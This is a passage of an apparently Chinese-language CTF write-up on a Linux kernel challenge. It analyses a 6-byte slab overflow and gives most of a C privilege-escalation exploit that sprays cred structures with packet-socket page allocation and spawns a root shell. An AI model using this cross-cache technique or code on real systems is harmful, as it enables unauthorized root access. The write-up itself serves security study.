class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再调用<code>PACKET_TX_RING</code>或者<code>PACKET_RX_RING</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line">req.tp_block_size = size;</span><br><span class="line">req.tp_block_nr = nr;</span><br><span class="line">req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br></pre></td></tr></table></figure><p>之后便会分配<code>tp_frame_nr</code>个页框,并且是直接从伙伴系统中提取</p><p>并且当关闭socket时,会将这些页框释放</p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>内核保护smap,smep,kpti,kaslr这些都开了</p><p>关键模块为<code>cache_of_castaway.ko</code></p><p>内部创建了一个分配大小为512的kmem_cache,创建标志设置了slab_account,因此不会和其他kmem_cache合并</p><p>模块只注册了ioctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// r12</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6[<span class="number">3</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">0xCAFEBABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(v6, a3, <span class="number">24LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    mutex_lock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0xF00DBABE</span> )</span><br><span class="line">      v3 = castaway_edit(v6[<span class="number">0</span>], v6[<span class="number">1</span>], v6[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v3 = <span class="number">-1LL</span>;</span><br><span class="line">LABEL_5:</span><br><span class="line">    mutex_unlock(&amp;castaway_lock);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_lock(&amp;castaway_lock);</span><br><span class="line">  v3 = castaway_ctr;</span><br><span class="line">  <span class="keyword">if</span> ( castaway_ctr &lt;= <span class="number">399</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++castaway_ctr;</span><br><span class="line">    v5 = (_QWORD *)(castaway_arr + <span class="number">8</span> * v3);</span><br><span class="line">    *v5 = kmem_cache_alloc(castaway_cachep, <span class="number">0x400DC0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(castaway_arr + <span class="number">8</span> * v3) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))castaway_ioctl_cold)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的castaway_add就是简单的从kmem_cache中申请一个obj</p><p>但是castaway_edit中存在一个溢出漏洞,会溢出6个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">castaway_edit</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">size_t</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> src[<span class="number">512</span>]; <span class="comment">// [rsp+0h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+200h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x18F</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x200</span> )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  _check_object_size(src, a2, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(src, a3, a2) )</span><br><span class="line">    <span class="keyword">return</span> castaway_edit_cold();</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="type">void</span> *)(*(_QWORD *)(castaway_arr + <span class="number">8</span> * a1) + <span class="number">6LL</span>), src, a2);</span><br><span class="line">  <span class="keyword">return</span> a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编辑堆块时应该传入如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为是复现,所以就直接说明思路了</p><ol><li><p>首先排干原有的cred_jar</p></li><li><p>接着通过setsockopt进行大量的基于buddy system的页级内存分配</p><p>可以看到内核刚启动时,buddy system中也并没有太多低order的空闲页</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ctf@CoR:~$ <span class="built_in">cat</span> /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      0      0      0      0      0      0      0      1      1     </span><br><span class="line">Node 0, zone    DMA32      3      2      2      2      0      1      2      3      2      2     </span><br><span class="line">Node 0, zone   Normal      2      2      2      2      0      2      1      2      2      2    </span><br></pre></td></tr></table></figure><p>那么当进行大量分配时,必然会取到许多原本是物理相邻的页</p></li><li><p>之后我们再每间隔一个页便释放掉一个,然后再大量clone进程(使用clone能够减少一些噪声影响),其中最主要的希望这些被释放的页被cred_jar使用</p></li><li><p>继续释放剩余的页,并将其申请为castaway_cache的slab页,然后触发所有object的溢出漏洞,寄希望能够出现某一个object溢出后刚好修改位于下一个页的cred结构体</p></li><li><p>进行询问操作,判断是否存在子进程的uid被成功修改</p></li></ol><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_CRED_START (PGV_PAGE_NUM / 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SPRAY_NUM 514</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_NUM 400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SIZE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_PER_SLUB 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span>  size;</span><br><span class="line">    <span class="type">void</span>    *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">    .tv_sec = <span class="number">1145141919</span>,</span><br><span class="line">    .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>], check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *shell_args[] = &#123; bin_sh_str, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="type">char</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="type">char</span> root_str[] = <span class="string">&quot;\033[32m\033[1m[+] Successful to get the root.\n&quot;</span></span><br><span class="line">                  <span class="string">&quot;\033[34m[*] Execve root shell now...\033[0m\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xCAFEBABE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int64_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> <span class="title">r</span> =</span> &#123;</span><br><span class="line">        .index = index,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(dev_fd, <span class="number">0xF00DBABE</span>, &amp;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">waiting_for_root_fn</span><span class="params">(<span class="type">void</span> *args)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rdi, rdi; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rdx, 1;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rax, rax; &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall;      &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 102; &quot;</span> <span class="comment">/* getuid() */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   cmp rax, 0; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   jne failed; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rdi, 1; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rsi, [root_str]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rdx, 80; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 1;&quot;</span>    <span class="comment">/* write(1, root_str, 71) */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rdx, rdx;   &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 59;    &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall;        &quot;</span>   <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;failed: &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   xor rsi, rsi; &quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   mov rax, 35; &quot;</span>  <span class="comment">/* nanosleep() */</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="type">long</span> <span class="title function_">simple_clone</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span> (*fn)(<span class="type">void</span> *))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span></span><br><span class="line">    __asm__ <span class="title 